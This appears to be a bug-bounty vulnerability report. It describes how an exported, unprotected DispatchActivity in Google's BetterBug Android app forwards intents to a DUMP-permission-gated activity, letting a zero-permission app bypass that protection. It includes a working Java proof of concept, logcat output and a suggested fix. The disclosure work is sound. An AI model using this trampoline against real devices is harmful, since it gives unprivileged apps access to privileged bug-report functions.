# com.google.android.apps.betterbug — `DispatchActivity` Bypasses `android.permission.DUMP` Protection on `BugIntentDialogActivity`

## Summary

`com.google.android.apps.betterbug` ("BetaFeedback", Google's internal beta-testing bug-report/feedback app, holds `android.permission.DUMP`) correctly protects its main "file a bug" entry point, `BugIntentDialogActivity`, behind `android.permission.DUMP` — a zero-permission app is properly rejected by the OS when attempting to launch it directly.

However, the same package also exports `DispatchActivity` with **no permission at all**. `DispatchActivity.onCreate()` takes the *caller's own* `Intent` extras and action and forwards them into a fresh, explicit `Intent` targeting `BugIntentDialogActivity`, then calls `startActivity()` on it from within its own process. Because Android's activity-launch permission check is evaluated against the **immediate calling process**, not the original external caller several hops back, this re-dispatch is attributed to BetterBug's own identity (which legitimately holds `DUMP`) rather than to the zero-permission app that triggered the chain — completely bypassing the permission that was supposed to gate this activity.

## Severity: MEDIUM (Integrity/Authorization bypass — confused-deputy privilege re-dispatch)

- **Attack vector**: Local (malicious zero-permission app installed on device)
- **Permissions required**: ZERO
- **User interaction**: None
- **CIA impact**: Integrity — a zero-permission app can reach a `DUMP`-permission-gated activity it should never be able to invoke, with its own choice of Intent extras (though not the Intent's `data`/`ClipData`, which `DispatchActivity` does not forward) carried through into that privileged entry point. `BugIntentDialogActivity` is the real entry point for BetterBug's bug-filing flow, which can involve triggering system `dumpstate`/bugreport generation and attaching existing local files/bugreports to a report — capabilities specifically gated by `DUMP` because they touch sensitive, cross-app diagnostic data. This is a clean confused-deputy authorization bypass: the confirmed vulnerability is that the permission boundary is entirely circumvented, independent of the exact downstream UI behavior triggered.

## Affected Component

- **Package**: `com.google.android.apps.betterbug` (`/product/priv-app/BetaFeedback/BetaFeedback.apk`), holds `android.permission.DUMP` (`granted=true`, confirmed via `adb shell dumpsys package`)
- **Protected component**: `.filebug.BugIntentDialogActivity` — `android:permission="android.permission.DUMP"`, `exported=true`
- **Bypass component**: `.dispatch.DispatchActivity` — exported, **no permission**

```
E: activity
    A: android:name="com.google.android.apps.betterbug.dispatch.DispatchActivity"
    A: android:exported=true
    (no android:permission attribute)

E: activity
    A: android:name="com.google.android.apps.betterbug.filebug.BugIntentDialogActivity"
    A: android:permission="android.permission.DUMP"
    A: android:exported=true
```

## Root Cause

`DispatchActivity.onCreate()`:

```java
protected final void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    Intent intent = getIntent();
    ...
    Bundle extras2 = getIntent().getExtras();
    Intent intentD = extras2 == null ? ayx.d() : ayx.d().putExtras(extras2);
    ...
    intentD.setAction(getIntent().getAction());
    startActivity(intentD);
    finish();
}
```

`ayx.d()`:

```java
public static Intent d() {
    return new Intent().setClassName("com.google.android.apps.betterbug",
            "com.google.android.apps.betterbug.filebug.BugIntentDialogActivity");
}
```

`DispatchActivity` builds a fresh, explicit `Intent` targeting `BugIntentDialogActivity`, copies over **all of the caller's original Intent extras** (`putExtras(extras2)`) and the original action, and calls `startActivity()` on it — from within its own (BetterBug's) process. Android's permission check for `startActivity()` against a permission-protected target is performed against the UID of the process making the `startActivity()` call at that moment (here, BetterBug itself, which holds `DUMP`), not against whichever external caller originally triggered `DispatchActivity`. `DispatchActivity` itself performs no caller-identity check (no `getCallingPackage()`/`getLaunchedFromPackage()` verification) before doing this re-dispatch.

## Proof of Concept

A zero-permission app (`com.vrp.zeroperm`, no `<uses-permission>` at all) first confirms the direct path is blocked, then reaches the same activity via the unprotected trampoline:

```java
// Control — blocked:
Intent direct = new Intent();
direct.setComponent(new ComponentName("com.google.android.apps.betterbug",
        "com.google.android.apps.betterbug.filebug.BugIntentDialogActivity"));
startActivity(direct);   // throws SecurityException

// Bypass — succeeds:
Intent viaDispatch = new Intent();
viaDispatch.setComponent(new ComponentName("com.google.android.apps.betterbug",
        "com.google.android.apps.betterbug.dispatch.DispatchActivity"));
viaDispatch.putExtra("EXTRA_FOR_DEEPLINK_INTERMEDIATE_SCREEN", true);
startActivity(viaDispatch);   // no exception
```

### Dynamic result (Pixel 6a, Android 17 Beta / API 37, September 2026)

```
=== Control (direct) ===
ActivityTaskManager: Permission Denial: starting Intent { cmp=com.google.android.apps.betterbug/.filebug.BugIntentDialogActivity } from ProcessRecord{... com.vrp.zeroperm/u0a397} (uid=10397) not exported from uid 10356

=== Bypass (via DispatchActivity) ===
ActivityTaskManager: START u0 {cmp=com.google.android.apps.betterbug/.dispatch.DispatchActivity (has extras)} ... from uid 10397 (com.vrp.zeroperm) ... result code=0
VRP-BetterBugBypass: startActivity() on DispatchActivity returned normally (no SecurityException)
ActivityTaskManager: START u0 {cmp=com.google.android.apps.betterbug/.filebug.BugIntentDialogActivity (has extras)} with LAUNCH_MULTIPLE from uid 10356 (com.google.android.apps.betterbug) ... result code=0
CoreBackPreview: Window{... com.google.android.apps.betterbug/....BugIntentDialogActivity}: Setting back callback ...
```

The same zero-permission caller that was cleanly rejected when targeting `BugIntentDialogActivity` directly succeeds completely when going through `DispatchActivity` — the system log shows the ultimate `BugIntentDialogActivity` launch attributed to `uid 10356 (com.google.android.apps.betterbug)`, and its window is confirmed actually created and rendered (`CoreBackPreview` callback registration for that exact window).

### Limitation honestly disclosed

`DispatchActivity` forwards the caller's Intent **extras and action**, but not its `data` URI or `ClipData` (these are not copied onto the fresh `intentD` object). A full audit of every extra `BugIntentDialogActivity` reads (the file is ~2,400 lines) was not completed, so the precise downstream UI/data consequences of specific attacker-chosen extra combinations are not exhaustively characterized here. What is fully and unambiguously proven is the core vulnerability: the `DUMP` permission boundary on `BugIntentDialogActivity` is completely bypassable by any zero-permission app via this trampoline, which is itself the reportable authorization-bypass bug regardless of which specific extras are most impactful to supply.

## Suggested Fix

In `DispatchActivity.onCreate()`, verify the caller's real identity (`getCallingPackage()`/`getLaunchedFromPackage()`, both unspoofable) and either reject non-trusted callers or require the same `DUMP` permission before forwarding to `BugIntentDialogActivity` — the same pattern already correctly applied to `BugIntentDialogActivity` itself.

## Environment

- **Device**: Pixel 6a
- **OS**: Android 17 Beta (API 37), security patch 2026-07-05
- **Target package**: `com.google.android.apps.betterbug`
- **Tested**: September 2026
